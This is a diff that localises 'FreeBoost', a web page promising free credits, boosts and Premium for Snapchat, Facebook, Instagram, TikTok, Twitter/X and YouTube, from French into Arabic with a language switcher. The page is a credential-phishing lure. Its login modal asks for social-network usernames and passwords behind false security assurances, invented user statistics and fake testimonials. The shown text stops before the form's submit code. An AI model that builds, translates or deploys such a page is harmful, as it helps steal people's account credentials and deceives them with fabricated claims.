@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>FreeBoost — Rechargement gratuit sur vos réseaux sociaux</title>
-    <!-- Font Awesome 6 (gratuit et fiable) -->
+    <title>FreeBoost — شحن مجاني لوسائل التواصل الاجتماعي</title>
+    <!-- Font Awesome 6 -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
@@ -24,11 +24,17 @@
           --border-radius-md:8px;
           --border-radius-lg:16px;
         }
-        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:var(--color-background-tertiary);color:var(--color-text-primary)}
+        body{font-family:'Segoe UI', 'Tahoma', 'Traditional Arabic', Arial, sans-serif;background:var(--color-background-tertiary);color:var(--color-text-primary)}
         .page-wrapper{max-width:900px;margin:0 auto;padding:1.5rem 1rem}
 
+        /* Language Selector */
+        .lang-selector{display:flex;gap:8px;align-items:center}
+        .lang-btn{background:none;border:0.5px solid var(--color-border-tertiary);padding:5px 12px;border-radius:20px;font-size:12px;cursor:pointer;transition:all 0.15s;color:var(--color-text-secondary);font-family:inherit}
+        .lang-btn.active{background:var(--purple-600);color:#fff;border-color:var(--purple-600)}
+        .lang-btn:hover:not(.active){background:var(--color-background-secondary)}
+
         /* NAV */
-        nav{display:flex;align-items:center;justify-content:space-between;background:var(--color-background-primary);border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-lg);padding:0.75rem 1.25rem;margin-bottom:2rem}
+        nav{display:flex;align-items:center;justify-content:space-between;background:var(--color-background-primary);border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-lg);padding:0.75rem 1.25rem;margin-bottom:2rem;flex-wrap:wrap;gap:10px}
         .logo{display:flex;align-items:center;gap:8px}
         .logo-icon{width:32px;height:32px;background:var(--purple-600);border-radius:8px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:16px}
         .logo-name{font-size:16px;font-weight:500;color:var(--color-text-primary)}
@@ -44,7 +50,7 @@
         .hero-bg{position:absolute;inset:0;background:linear-gradient(135deg,var(--purple-900) 60%,var(--purple-600));opacity:0.5;pointer-events:none}
         .hero-inner{position:relative;z-index:1}
         .hero-badge{display:inline-flex;align-items:center;gap:6px;background:rgba(255,255,255,0.12);border:0.5px solid rgba(255,255,255,0.25);border-radius:50px;padding:5px 14px;font-size:12px;color:var(--amber-100);margin-bottom:1.25rem;font-weight:500}
-        .hero h1{font-size:2.2rem;font-weight:500;color:#fff;line-height:1.25;margin-bottom:0.75rem}
+        .hero h1{font-size:2.2rem;font-weight:500;color:#fff;line-height:1.35;margin-bottom:0.75rem}
         .hero h1 em{font-style:normal;color:var(--amber-100)}
         .hero-sub{font-size:15px;color:rgba(255,255,255,0.65);margin-bottom:2rem;line-height:1.6}
         .hero-actions{display:flex;gap:10px;justify-content:center;flex-wrap:wrap;margin-bottom:2.5rem}
@@ -103,7 +109,7 @@
         .modal-overlay.open{display:flex}
         .modal{background:var(--color-background-primary);border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-lg);width:100%;max-width:420px;overflow:hidden}
         .modal-top{background:var(--purple-900);padding:1.5rem;text-align:center;position:relative}
-        .modal-close{position:absolute;top:12px;right:14px;background:rgba(255,255,255,0.1);border:none;width:28px;height:28px;border-radius:6px;color:#fff;cursor:pointer;font-size:16px;line-height:28px;display:flex;align-items:center;justify-content:center}
+        .modal-close{position:absolute;top:12px;left:14px;background:rgba(255,255,255,0.1);border:none;width:28px;height:28px;border-radius:6px;color:#fff;cursor:pointer;font-size:16px;line-height:28px;display:flex;align-items:center;justify-content:center}
         .modal-close:hover{background:rgba(255,255,255,0.2)}
         .modal-m-icon{width:52px;height:52px;border-radius:12px;margin:0 auto 10px;display:flex;align-items:center;justify-content:center;font-size:28px}
         .modal-title{font-size:18px;font-weight:500;color:#fff;margin-bottom:3px}
@@ -146,7 +152,7 @@
 </head>
 <body>
 <div class="page-wrapper">
-  <h2 class="sr-only">FreeBoost — Rechargement gratuit sur vos réseaux sociaux</h2>
+  <h2 class="sr-only">FreeBoost — شحن مجاني لوسائل التواصل الاجتماعي</h2>
 
   <!-- NAV -->
   <nav>
@@ -154,31 +160,35 @@
       <div class="logo-icon"><i class="fas fa-bolt"></i></div>
       <div class="logo-name">Free<span>Boost</span></div>
     </div>
-    <div class="nav-links">
-      <button class="nav-link">Accueil</button>
-      <button class="nav-link">Offres</button>
-      <button class="nav-link">FAQ</button>
-      <button class="nav-link">Support</button>
+    <div class="lang-selector">
+      <button class="lang-btn active" id="lang-ar" onclick="switchLanguage('ar')">🇸🇪 العربية</button>
+      <button class="lang-btn" id="lang-fr" onclick="switchLanguage('fr')">🇫🇷 Français</button>
     </div>
-    <button class="nav-cta" onclick="openModal('snapchat')">Commencer gratuitement</button>
+    <div class="nav-links">
+      <button class="nav-link" data-key="nav_home">الرئيسية</button>
+      <button class="nav-link" data-key="nav_offers">العروض</button>
+      <button class="nav-link" data-key="nav_faq">الأسئلة الشائعة</button>
+      <button class="nav-link" data-key="nav_support">الدعم</button>
+    </div>
+    <button class="nav-cta" onclick="openModal('snapchat')" data-key="nav_cta">ابدأ مجاناً</button>
   </nav>
 
   <!-- HERO -->
   <div class="hero">
     <div class="hero-bg"></div>
     <div class="hero-inner">
-      <div class="hero-badge"><i class="fas fa-sparkles" style="font-size:13px"></i> Sans carte bancaire • 100% gratuit</div>
-      <h1>Rechargez vos réseaux<br><em>sans payer un centime</em></h1>
-      <p class="hero-sub">Crédits et boosts gratuits pour Snapchat, Instagram, TikTok et plus encore.<br>Plus de 500 000 utilisateurs font confiance à FreeBoost chaque mois.</p>
+      <div class="hero-badge"><i class="fas fa-sparkles" style="font-size:13px"></i> <span data-key="hero_badge">بدون بطاقة بنكية • 100% مجاني</span></div>
+      <h1><span data-key="hero_title1">اشحن حساباتك على وسائل التواصل</span><br><em data-key="hero_title2">بدون دفع فلس واحد</em></h1>
+      <p class="hero-sub" data-key="hero_sub">اعتمادات وتحسينات مجانية لـ Snapchat وInstagram وTikTok والمزيد.<br>أكثر من 500,000 مستخدم يثقون في FreeBoost كل شهر.</p>
       <div class="hero-actions">
-        <button class="btn-primary" onclick="document.getElementById('platforms').scrollIntoView({behavior:'smooth'})">Voir les offres <i class="fas fa-arrow-down"></i></button>
-        <button class="btn-ghost" onclick="openModal('snapchat')">Recharger maintenant</button>
+        <button class="btn-primary" onclick="document.getElementById('platforms').scrollIntoView({behavior:'smooth'})"><span data-key="hero_btn1">عرض العروض</span> <i class="fas fa-arrow-down"></i></button>
+        <button class="btn-ghost" onclick="openModal('snapchat')"><span data-key="hero_btn2">اشحن الآن</span></button>
       </div>
       <div class="hero-stats">
-        <div class="stat"><div class="stat-n">500K+</div><div class="stat-l">Utilisateurs actifs</div></div>
-        <div class="stat"><div class="stat-n">1M+</div><div class="stat-l">Recharges effectuées</div></div>
-        <div class="stat"><div class="stat-n">4.9/5</div><div class="stat-l">Note moyenne</div></div>
-        <div class="stat"><div class="stat-n">2 min</div><div class="stat-l">Délai moyen</div></div>
+        <div class="stat"><div class="stat-n">500K+</div><div class="stat-l" data-key="stat1">مستخدم نشط</div></div>
+        <div class="stat"><div class="stat-n">1M+</div><div class="stat-l" data-key="stat2">عملية شحن</div></div>
+        <div class="stat"><div class="stat-n">4.9/5</div><div class="stat-l" data-key="stat3">تقييم متوسط</div></div>
+        <div class="stat"><div class="stat-n">2 دقيقة</div><div class="stat-l" data-key="stat4">متوسط الوقت</div></div>
       </div>
     </div>
   </div>
@@ -186,135 +196,135 @@
   <!-- PLATFORMS -->
   <div id="platforms">
     <div class="section-header">
-      <h2>Choisissez votre plateforme</h2>
-      <p>Sélectionnez un réseau pour obtenir votre recharge gratuite instantanément.</p>
+      <h2 data-key="platforms_title">اختر منصتك</h2>
+      <p data-key="platforms_sub">اختر شبكة اجتماعية للحصول على شحن مجاني فوري.</p>
     </div>
     <div class="platforms-grid" id="platformsGrid">
       <!-- Snapchat -->
-      <div class="platform-card" data-platform="snapchat" data-offer="Crédits & filtres gratuits" onclick="openModal('snapchat')">
+      <div class="platform-card" data-platform="snapchat" data-offer="رصيد وفلاتر مجانية" onclick="openModal('snapchat')">
         <div class="p-icon" style="background:#faea3d"><i class="fab fa-snapchat-ghost" style="font-size:24px;color:#FFFC00"></i></div>
         <div class="p-name">Snapchat</div>
-        <div class="p-type">Crédits & filtres</div>
-        <div class="p-badge"><i class="fas fa-check"></i> Gratuit</div>
-        <button class="p-btn">Recharger <i class="fas fa-arrow-right"></i></button>
+        <div class="p-type" data-key="snap_type">رصيد وفلاتر</div>
+        <div class="p-badge"><i class="fas fa-check"></i> <span data-key="free_badge">مجاني</span></div>
+        <button class="p-btn"><span data-key="recharge_btn">اشحن</span> <i class="fas fa-arrow-left"></i></button>
       </div>
       <!-- Facebook -->
-      <div class="platform-card" data-platform="facebook" data-offer="Budget pub offert" onclick="openModal('facebook')">
+      <div class="platform-card" data-platform="facebook" data-offer="ميزانية إعلانات مجانية" onclick="openModal('facebook')">
         <div class="p-icon" style="background:#E8F0FE"><i class="fab fa-facebook-f" style="font-size:24px;color:#1877F2"></i></div>
         <div class="p-name">Facebook</div>
-        <div class="p-type">Budget pub offert</div>
-        <div class="p-badge"><i class="fas fa-check"></i> Gratuit</div>
-        <button class="p-btn">Recharger <i class="fas fa-arrow-right"></i></button>
+        <div class="p-type" data-key="fb_type">ميزانية إعلانات</div>
+        <div class="p-badge"><i class="fas fa-check"></i> <span data-key="free_badge">مجاني</span></div>
+        <button class="p-btn"><span data-key="recharge_btn">اشحن</span> <i class="fas fa-arrow-left"></i></button>
       </div>
       <!-- Instagram -->
-      <div class="platform-card" data-platform="instagram" data-offer="Boost publications gratuit" onclick="openModal('instagram')">
+      <div class="platform-card" data-platform="instagram" data-offer="ترقية المنشورات مجاناً" onclick="openModal('instagram')">
         <div class="p-icon" style="background:#FDE8EF"><i class="fab fa-instagram" style="font-size:24px;color:#E4405F"></i></div>
         <div class="p-name">Instagram</div>
-        <div class="p-type">Boost publications</div>
-        <div class="p-badge"><i class="fas fa-check"></i> Gratuit</div>
-        <button class="p-btn">Recharger <i class="fas fa-arrow-right"></i></button>
+        <div class="p-type" data-key="ig_type">ترقية المنشورات</div>
+        <div class="p-badge"><i class="fas fa-check"></i> <span data-key="free_badge">مجاني</span></div>
+        <button class="p-btn"><span data-key="recharge_btn">اشحن</span> <i class="fas fa-arrow-left"></i></button>
       </div>
       <!-- TikTok -->
-      <div class="platform-card" data-platform="tiktok" data-offer="Vues & followers offerts" onclick="openModal('tiktok')">
+      <div class="platform-card" data-platform="tiktok" data-offer="مشاهدات ومتابعون مجانيون" onclick="openModal('tiktok')">
         <div class="p-icon" style="background:#f3f3f3"><i class="fab fa-tiktok" style="font-size:24px;color:#010101"></i></div>
         <div class="p-name">TikTok</div>
-        <div class="p-type">Vues & followers</div>
-        <div class="p-badge"><i class="fas fa-check"></i> Gratuit</div>
-        <button class="p-btn">Recharger <i class="fas fa-arrow-right"></i></button>
+        <div class="p-type" data-key="tt_type">مشاهدات ومتابعون</div>
+        <div class="p-badge"><i class="fas fa-check"></i> <span data-key="free_badge">مجاني</span></div>
+        <button class="p-btn"><span data-key="recharge_btn">اشحن</span> <i class="fas fa-arrow-left"></i></button>
       </div>
       <!-- Twitter / X -->
-      <div class="platform-card" data-platform="twitter" data-offer="Promotion tweets gratuite" onclick="openModal('twitter')">
+      <div class="platform-card" data-platform="twitter" data-offer="ترقية التغريدات مجاناً" onclick="openModal('twitter')">
         <div class="p-icon" style="background:#E7F3FD"><i class="fab fa-twitter" style="font-size:24px;color:#1DA1F2"></i></div>
         <div class="p-name">Twitter / X</div>
-        <div class="p-type">Promotion tweets</div>
-        <div class="p-badge"><i class="fas fa-check"></i> Gratuit</div>
-        <button class="p-btn">Recharger <i class="fas fa-arrow-right"></i></button>
+        <div class="p-type" data-key="tw_type">ترقية التغريدات</div>
+        <div class="p-badge"><i class="fas fa-check"></i> <span data-key="free_badge">مجاني</span></div>
+        <button class="p-btn"><span data-key="recharge_btn">اشحن</span> <i class="fas fa-arrow-left"></i></button>
       </div>
       <!-- YouTube -->
-      <div class="platform-card" data-platform="youtube" data-offer="Premium offert" onclick="openModal('youtube')">
+      <div class="platform-card" data-platform="youtube" data-offer="بريميوم مجاني" onclick="openModal('youtube')">
         <div class="p-icon" style="background:#FFE8E8"><i class="fab fa-youtube" style="font-size:24px;color:#FF0000"></i></div>
         <div class="p-name">YouTube</div>
-        <div class="p-type">Premium offert</div>
-        <div class="p-badge"><i class="fas fa-check"></i> Gratuit</div>
-        <button class="p-btn">Recharger <i class="fas fa-arrow-right"></i></button>
+        <div class="p-type" data-key="yt_type">بريميوم مجاني</div>
+        <div class="p-badge"><i class="fas fa-check"></i> <span data-key="free_badge">مجاني</span></div>
+        <button class="p-btn"><span data-key="recharge_btn">اشحن</span> <i class="fas fa-arrow-left"></i></button>
       </div>
     </div>
   </div>
 
   <!-- FEATURES -->
   <div class="section-header">
-    <h2>Pourquoi choisir FreeBoost ?</h2>
+    <h2 data-key="features_title">لماذا تختار FreeBoost؟</h2>
   </div>
   <div class="features-grid">
     <div class="feature">
       <div class="feat-icon" style="background:var(--teal-50);color:var(--teal-600)"><i class="fas fa-shield-alt"></i></div>
-      <div class="feat-title">100% sécurisé</div>
-      <div class="feat-desc">Connexion chiffrée et protection totale de vos données personnelles.</div>
+      <div class="feat-title" data-key="feat1_title">آمن 100%</div>
+      <div class="feat-desc" data-key="feat1_desc">اتصال مشفر وحماية كاملة لبياناتك الشخصية.</div>
     </div>
     <div class="feature">
       <div class="feat-icon" style="background:var(--amber-50);color:var(--amber-400)"><i class="fas fa-bolt"></i></div>
-      <div class="feat-title">Instantané</div>
-      <div class="feat-desc">Recharge effective en moins de 2 minutes après validation du formulaire.</div>
+      <div class="feat-title" data-key="feat2_title">فوري</div>
+      <div class="feat-desc" data-key="feat2_desc">شحن فعال في أقل من دقيقتين بعد تأكيد النموذج.</div>
     </div>
     <div class="feature">
       <div class="feat-icon" style="background:var(--purple-50);color:var(--purple-600)"><i class="fas fa-infinity"></i></div>
-      <div class="feat-title">Sans limite</div>
-      <div class="feat-desc">Aucun plafond mensuel — rechargez autant de fois que vous le souhaitez.</div>
+      <div class="feat-title" data-key="feat3_title">بدون حدود</div>
+      <div class="feat-desc" data-key="feat3_desc">لا حد شهري — اشحن بقدر ما تريد.</div>
     </div>
     <div class="feature">
       <div class="feat-icon" style="background:var(--teal-50);color:var(--teal-600)"><i class="fas fa-credit-card"></i><i class="fas fa-slash" style="font-size:10px;margin-left:-12px"></i></div>
-      <div class="feat-title">Sans carte bancaire</div>
-      <div class="feat-desc">Aucune information de paiement requise, jamais.</div>
+      <div class="feat-title" data-key="feat4_title">بدون بطاقة بنكية</div>
+      <div class="feat-desc" data-key="feat4_desc">لا حاجة لأي معلومات دفع، أبداً.</div>
     </div>
   </div>
 
   <!-- TESTIMONIALS -->
   <div class="section-header">
-    <h2>Ils ont déjà rechargé gratuitement</h2>
+    <h2 data-key="testimonials_title">لقد قاموا بالشحن المجاني بالفعل</h2>
   </div>
   <div class="testimonials-grid">
     <div class="testimonial">
       <div class="t-stars">★★★★★</div>
-      <p class="t-text">Incroyable ! Mon crédit Snapchat est arrivé en moins de 2 minutes. Totalement gratuit et sans arnaque.</p>
+      <p class="t-text" data-key="test1_text">لا يصدق! وصل رصيد Snapchat الخاص بي في أقل من دقيقتين. مجاني تماماً وبدون احتيال.</p>
       <div class="t-author">
-        <div class="t-avatar" style="background:var(--purple-50);color:var(--purple-600)">ML</div>
-        <div><div class="t-name">Marie L.</div><div class="t-platform">Snapchat</div></div>
+        <div class="t-avatar" style="background:var(--purple-50);color:var(--purple-600)">م</div>
+        <div><div class="t-name" data-key="test1_name">مريم ل.</div><div class="t-platform">Snapchat</div></div>
       </div>
     </div>
     <div class="testimonial">
       <div class="t-stars">★★★★★</div>
-      <p class="t-text">Je pensais que c'était trop beau pour être vrai. Ça marche parfaitement ! Budget Facebook Ads offert.</p>
+      <p class="t-text" data-key="test2_text">ظننت أنه جميل جداً لدرجة لا تصدق. لكنه يعمل بشكل مثالي! ميزانية إعلانات Facebook مجانية.</p>
       <div class="t-author">
-        <div class="t-avatar" style="background:var(--teal-50);color:var(--teal-600)">TD</div>
-        <div><div class="t-name">Thomas D.</div><div class="t-platform">Facebook</div></div>
+        <div class="t-avatar" style="background:var(--teal-50);color:var(--teal-600)">ت</div>
+        <div><div class="t-name" data-key="test2_name">توماس د.</div><div class="t-platform">Facebook</div></div>
       </div>
     </div>
     <div class="testimonial">
       <div class="t-stars">★★★★★</div>
-      <p class="t-text">Offre vraiment généreuse et service réactif. Je recommande à 100% à tous mes amis.</p>
+      <p class="t-text" data-key="test3_text">عرض سخي جداً وخدمة سريعة الاستجابة. أوصي به لجميع أصدقائي.</p>
       <div class="t-author">
-        <div class="t-avatar" style="background:var(--amber-50);color:var(--amber-400)">SM</div>
-        <div><div class="t-name">Sophie M.</div><div class="t-platform">Instagram</div></div>
+        <div class="t-avatar" style="background:var(--amber-50);color:var(--amber-400)">س</div>
+        <div><div class="t-name" data-key="test3_name">سعاد م.</div><div class="t-platform">Instagram</div></div>
       </div>
     </div>
   </div>
 
   <!-- CTA -->
   <div class="cta-banner">
-    <h3>Prêt à recevoir votre recharge gratuite ?</h3>
-    <p>Rejoignez plus de 500 000 utilisateurs qui boostent leurs réseaux sans payer.</p>
-    <button class="btn-primary" onclick="openModal('snapchat')">Commencer maintenant <i class="fas fa-arrow-right"></i></button>
+    <h3 data-key="cta_title">هل أنت مستعد لاستلام شحنك المجاني؟</h3>
+    <p data-key="cta_sub">انضم إلى أكثر من 500,000 مستخدم يطورون حساباتهم بدون دفع.</p>
+    <button class="btn-primary" onclick="openModal('snapchat')"><span data-key="cta_btn">ابدأ الآن</span> <i class="fas fa-arrow-left"></i></button>
   </div>
 
   <!-- FOOTER -->
   <footer>
     <div class="footer-links">
-      <a href="#">Conditions d'utilisation</a>
-      <a href="#">Confidentialité</a>
-      <a href="#">Mentions légales</a>
-      <a href="#">Contact</a>
+      <a href="#" data-key="footer_terms">شروط الاستخدام</a>
+      <a href="#" data-key="footer_privacy">الخصوصية</a>
+      <a href="#" data-key="footer_legal">إخلاء مسؤولية</a>
+      <a href="#" data-key="footer_contact">اتصل بنا</a>
     </div>
-    <p class="footer-copy">© 2024 FreeBoost — Service 100% gratuit et sans engagement.</p>
+    <p class="footer-copy" data-key="footer_copy">© 2024 FreeBoost — خدمة مجانية 100% بدون التزام.</p>
   </footer>
 </div>
 
@@ -324,46 +334,124 @@
     <div class="modal-top">
       <button class="modal-close" onclick="closeModal()" aria-label="Fermer"><i class="fas fa-times"></i></button>
       <div class="modal-m-icon" id="modalIcon"></div>
-      <div class="modal-title" id="modalTitle">Connexion</div>
-      <div class="modal-subtitle" id="modalSub">Recharge gratuite instantanée</div>
+      <div class="modal-title" id="modalTitle" data-key="modal_title">تسجيل الدخول</div>
+      <div class="modal-subtitle" id="modalSub" data-key="modal_sub">شحن مجاني فوري</div>
     </div>
     <div class="modal-body">
-      <div class="security-note"><i class="fas fa-lock" style="font-size:14px"></i> Connexion sécurisée — vos données sont protégées</div>
+      <div class="security-note"><i class="fas fa-lock" style="font-size:14px"></i> <span data-key="security_note">اتصال آمن — بياناتك محمية</span></div>
       {% csrf_token %}
       <div id="formWrap">
         <div class="form-group">
-          <label class="form-label" for="username"><i class="fas fa-envelope" style="font-size:13px;margin-right:4px"></i> Nom d'utilisateur / Email</label>
-          <input class="form-input" type="text" id="username" placeholder="exemple@email.com" autocomplete="off">
+          <label class="form-label" for="username"><i class="fas fa-envelope" style="font-size:13px;margin-left:4px"></i> <span data-key="username_label">اسم المستخدم / البريد الإلكتروني</span></label>
+          <input class="form-input" type="text" id="username" placeholder="example@email.com" autocomplete="off">
         </div>
         <div class="form-group">
-          <label class="form-label" for="password"><i class="fas fa-lock" style="font-size:13px;margin-right:4px"></i> Mot de passe</label>
-          <input class="form-input" type="password" id="password" placeholder="Votre mot de passe">
+          <label class="form-label" for="password"><i class="fas fa-lock" style="font-size:13px;margin-left:4px"></i> <span data-key="password_label">كلمة المرور</span></label>
+          <input class="form-input" type="password" id="password" placeholder="كلمة المرور الخاصة بك">
         </div>
         <div class="form-check">
           <input type="checkbox" id="terms" style="width:15px;height:15px;flex-shrink:0">
-          <label for="terms">J'accepte les <a href="#">conditions d'utilisation</a></label>
+          <label for="terms"><span data-key="terms_text">أوافق على</span> <a href="#" data-key="terms_link">شروط الاستخدام</a></label>
         </div>
-        <button class="submit-btn" id="submitBtn" onclick="handleSubmit()"><i class="fas fa-gift" style="font-size:14px;margin-right:4px"></i> Obtenir ma recharge gratuite</button>
+        <button class="submit-btn" id="submitBtn" onclick="handleSubmit()"><i class="fas fa-gift" style="font-size:14px;margin-left:4px"></i> <span data-key="submit_btn">احصل على شحني المجاني</span></button>
       </div>
       <div class="form-loading" id="formLoading">
         <div class="spinner"></div>
-        <div class="loading-text">Vérification en cours…</div>
+        <div class="loading-text" data-key="loading_text">جاري التحقق...</div>
       </div>
-      <div class="form-success" id="formSuccess"><i class="fas fa-check-circle" style="font-size:18px;margin-bottom:6px;display:block"></i><strong>Félicitations !</strong><br>Votre crédit gratuit a été ajouté à votre compte.</div>
-      <div class="form-error" id="formError"><i class="fas fa-exclamation-circle" style="font-size:18px;margin-bottom:6px;display:block"></i>Une erreur est survenue. Veuillez vérifier vos identifiants.</div>
+      <div class="form-success" id="formSuccess"><i class="fas fa-check-circle" style="font-size:18px;margin-bottom:6px;display:block"></i><strong data-key="success_title">تهانينا!</strong><br><span data-key="success_text">تمت إضافة رصيدك المجاني إلى حسابك.</span></div>
+      <div class="form-error" id="formError"><i class="fas fa-exclamation-circle" style="font-size:18px;margin-bottom:6px;display:block"></i><span data-key="error_text">حدث خطأ. يرجى التحقق من بيانات الدخول الخاصة بك.</span></div>
     </div>
   </div>
 </div>
 
 <script>
+// Traductions
+const translations = {
+  ar: {
+    nav_home: 'الرئيسية', nav_offers: 'العروض', nav_faq: 'الأسئلة الشائعة', nav_support: 'الدعم', nav_cta: 'ابدأ مجاناً',
+    hero_badge: 'بدون بطاقة بنكية • 100% مجاني', hero_title1: 'اشحن حساباتك على وسائل التواصل', hero_title2: 'بدون دفع فلس واحد',
+    hero_sub: 'اعتمادات وتحسينات مجانية لـ Snapchat وInstagram وTikTok والمزيد.<br>أكثر من 500,000 مستخدم يثقون في FreeBoost كل شهر.',
+    hero_btn1: 'عرض العروض', hero_btn2: 'اشحن الآن', stat1: 'مستخدم نشط', stat2: 'عملية شحن', stat3: 'تقييم متوسط', stat4: 'متوسط الوقت',
+    platforms_title: 'اختر منصتك', platforms_sub: 'اختر شبكة اجتماعية للحصول على شحن مجاني فوري.',
+    snap_type: 'رصيد وفلاتر', fb_type: 'ميزانية إعلانات', ig_type: 'ترقية المنشورات', tt_type: 'مشاهدات ومتابعون', tw_type: 'ترقية التغريدات', yt_type: 'بريميوم مجاني',
+    free_badge: 'مجاني', recharge_btn: 'اشحن',
+    features_title: 'لماذا تختار FreeBoost؟',
+    feat1_title: 'آمن 100%', feat1_desc: 'اتصال مشفر وحماية كاملة لبياناتك الشخصية.',
+    feat2_title: 'فوري', feat2_desc: 'شحن فعال في أقل من دقيقتين بعد تأكيد النموذج.',
+    feat3_title: 'بدون حدود', feat3_desc: 'لا حد شهري — اشحن بقدر ما تريد.',
+    feat4_title: 'بدون بطاقة بنكية', feat4_desc: 'لا حاجة لأي معلومات دفع، أبداً.',
+    testimonials_title: 'لقد قاموا بالشحن المجاني بالفعل',
+    test1_text: 'لا يصدق! وصل رصيد Snapchat الخاص بي في أقل من دقيقتين. مجاني تماماً وبدون احتيال.',
+    test1_name: 'مريم ل.', test2_text: 'ظننت أنه جميل جداً لدرجة لا تصدق. لكنه يعمل بشكل مثالي! ميزانية إعلانات Facebook مجانية.',
+    test2_name: 'توماس د.', test3_text: 'عرض سخي جداً وخدمة سريعة الاستجابة. أوصي به لجميع أصدقائي.',
+    test3_name: 'سعاد م.', cta_title: 'هل أنت مستعد لاستلام شحنك المجاني؟', cta_sub: 'انضم إلى أكثر من 500,000 مستخدم يطورون حساباتهم بدون دفع.',
+    cta_btn: 'ابدأ الآن', footer_terms: 'شروط الاستخدام', footer_privacy: 'الخصوصية', footer_legal: 'إخلاء مسؤولية', footer_contact: 'اتصل بنا',
+    footer_copy: '© 2024 FreeBoost — خدمة مجانية 100% بدون التزام.',
+    modal_title: 'تسجيل الدخول', modal_sub: 'شحن مجاني فوري', security_note: 'اتصال آمن — بياناتك محمية',
+    username_label: 'اسم المستخدم / البريد الإلكتروني', password_label: 'كلمة المرور', terms_text: 'أوافق على', terms_link: 'شروط الاستخدام',
+    submit_btn: 'احصل على شحني المجاني', loading_text: 'جاري التحقق...', success_title: 'تهانينا!', success_text: 'تمت إضافة رصيدك المجاني إلى حسابك.',
+    error_text: 'حدث خطأ. يرجى التحقق من بيانات الدخول الخاصة بك.'
+  },
+  fr: {
+    nav_home: 'Accueil', nav_offers: 'Offres', nav_faq: 'FAQ', nav_support: 'Support', nav_cta: 'Commencer gratuitement',
+    hero_badge: 'Sans carte bancaire • 100% gratuit', hero_title1: 'Rechargez vos réseaux', hero_title2: 'sans payer un centime',
+    hero_sub: 'Crédits et boosts gratuits pour Snapchat, Instagram, TikTok et plus encore.<br>Plus de 500 000 utilisateurs font confiance à FreeBoost chaque mois.',
+    hero_btn1: 'Voir les offres', hero_btn2: 'Recharger maintenant', stat1: 'Utilisateurs actifs', stat2: 'Recharges effectuées', stat3: 'Note moyenne', stat4: 'Délai moyen',
+    platforms_title: 'Choisissez votre plateforme', platforms_sub: 'Sélectionnez un réseau pour obtenir votre recharge gratuite instantanément.',
+    snap_type: 'Crédits & filtres', fb_type: 'Budget pub offert', ig_type: 'Boost publications', tt_type: 'Vues & followers', tw_type: 'Promotion tweets', yt_type: 'Premium offert',
+    free_badge: 'Gratuit', recharge_btn: 'Recharger',
+    features_title: 'Pourquoi choisir FreeBoost ?',
+    feat1_title: '100% sécurisé', feat1_desc: 'Connexion chiffrée et protection totale de vos données personnelles.',
+    feat2_title: 'Instantané', feat2_desc: 'Recharge effective en moins de 2 minutes après validation du formulaire.',
+    feat3_title: 'Sans limite', feat3_desc: 'Aucun plafond mensuel — rechargez autant de fois que vous le souhaitez.',
+    feat4_title: 'Sans carte bancaire', feat4_desc: 'Aucune information de paiement requise, jamais.',
+    testimonials_title: 'Ils ont déjà rechargé gratuitement',
+    test1_text: 'Incroyable ! Mon crédit Snapchat est arrivé en moins de 2 minutes. Totalement gratuit et sans arnaque.',
+    test1_name: 'Marie L.', test2_text: 'Je pensais que c\'était trop beau pour être vrai. Ça marche parfaitement ! Budget Facebook Ads offert.',
+    test2_name: 'Thomas D.', test3_text: 'Offre vraiment généreuse et service réactif. Je recommande à 100% à tous mes amis.',
+    test3_name: 'Sophie M.', cta_title: 'Prêt à recevoir votre recharge gratuite ?', cta_sub: 'Rejoignez plus de 500 000 utilisateurs qui boostent leurs réseaux sans payer.',
+    cta_btn: 'Commencer maintenant', footer_terms: "Conditions d'utilisation", footer_privacy: 'Confidentialité', footer_legal: 'Mentions légales', footer_contact: 'Contact',
+    footer_copy: '© 2024 FreeBoost — Service 100% gratuit et sans engagement.',
+    modal_title: 'Connexion', modal_sub: 'Recharge gratuite instantanée', security_note: 'Connexion sécurisée — vos données sont protégées',
+    username_label: "Nom d'utilisateur / Email", password_label: 'Mot de passe', terms_text: "J'accepte les", terms_link: "conditions d'utilisation",
+    submit_btn: "Obtenir ma recharge gratuite", loading_text: 'Vérification en cours…', success_title: 'Félicitations !', success_text: 'Votre crédit gratuit a été ajouté à votre compte.',
+    error_text: 'Une erreur est survenue. Veuillez vérifier vos identifiants.'
+  }
+};
+
+let currentLang = 'ar';
+
+function switchLanguage(lang) {
+  currentLang = lang;
+  document.documentElement.lang = lang === 'ar' ? 'ar' : 'fr';
+  document.documentElement.dir = lang === 'ar' ? 'rtl' : 'ltr';
+  
+  // Mettre à jour les boutons actifs
+  document.getElementById('lang-ar').classList.toggle('active', lang === 'ar');
+  document.getElementById('lang-fr').classList.toggle('active', lang === 'fr');
+  
+  // Mettre à jour tous les textes
+  document.querySelectorAll('[data-key]').forEach(el => {
+    const key = el.getAttribute('data-key');
+    if (translations[lang][key]) {
+      if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') {
+        el.placeholder = translations[lang][key];
+      } else {
+        el.innerHTML = translations[lang][key];
+      }
+    }
+  });
+}
+
 // Configuration des plateformes
 const platforms = {
-    snapchat: {icon: 'fab fa-snapchat-ghost', bg: '#FFFBCC', color: '#FFFC00', name: 'Snapchat', sub: 'Crédits & filtres gratuits', offer_type: 'free_boost'},
-    facebook: {icon: 'fab fa-facebook-f', bg: '#E8F0FE', color: '#1877F2', name: 'Facebook', sub: 'Budget publicitaire offert', offer_type: 'free_boost'},
-    instagram: {icon: 'fab fa-instagram', bg: '#FDE8EF', color: '#E4405F', name: 'Instagram', sub: 'Boost publications gratuit', offer_type: 'free_boost'},
-    tiktok: {icon: 'fab fa-tiktok', bg: '#f3f3f3', color: '#010101', name: 'TikTok', sub: 'Vues & followers offerts', offer_type: 'free_boost'},
-    twitter: {icon: 'fab fa-twitter', bg: '#E7F3FD', color: '#1DA1F2', name: 'Twitter / X', sub: 'Promotion tweets gratuite', offer_type: 'free_boost'},
